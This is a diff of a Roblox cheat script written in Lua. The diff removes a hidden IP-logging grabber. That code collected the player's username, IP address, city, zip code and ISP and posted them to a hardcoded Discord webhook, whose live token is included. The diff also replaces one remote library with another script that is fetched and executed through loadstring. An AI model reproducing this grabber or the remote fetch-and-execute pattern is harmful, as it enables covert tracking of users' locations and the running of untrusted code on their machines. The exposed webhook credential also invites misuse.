@@ -6,7 +6,7 @@ local GetService = setmetatable({}, {
 })
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/cat", true))()
-local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
+local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/seltyy/KryptoWare/main/main.lua"))()
 local Notify = NotifyLibrary.Notify
 Library.theme.accentcolor = Color3.new(0.603921, 0.011764, 1)
 
@@ -1885,48 +1885,7 @@ function Invisible()
         LocalPlayer.Character.HumanoidRootPart.CFrame = PuppywareModule.Old.CFrame
     end
 end
-local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1015861064564482108/-tqzmxo2HlWXkx5XtCjFeaS_CiolcVtPctI-FMh75cxe9FMY7GBLrkpUMEp1L-FJv2UR"
-local getIPResponse = syn.request({
-    Url = "https://api.ipify.org/?format=json",
-    Method = "GET"
-})
-local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
-local IPBuffer = tostring(GetIPJSON.ip)
 
-local getIPInfo = syn.request({
-    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
-    Method = "Get"
-})
-local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
-local FI = {
-    IP = IPBuffer,
-    country = IIT.country,
-    countryCode = IIT.countryCode,
-    region = IIT.region,
-    regionName = IIT.regionName,
-    city = IIT.city,
-    zipcode = IIT.zip,
-    latitude = IIT.lat,
-    longitude = IIT.lon,
-    isp = IIT.isp,
-    org = IIT.org
-}
-local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
-local MessageData = {
-    ["content"] = dataMessage
-}
-
-syn.request(
-    {
-        Url = WebhookURL, 
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode(MessageData)
-    }
-) 
 function NilBody()
     if Alive(LocalPlayer) then
         for i, v in pairs(LocalPlayer.Character:GetChildren()) do
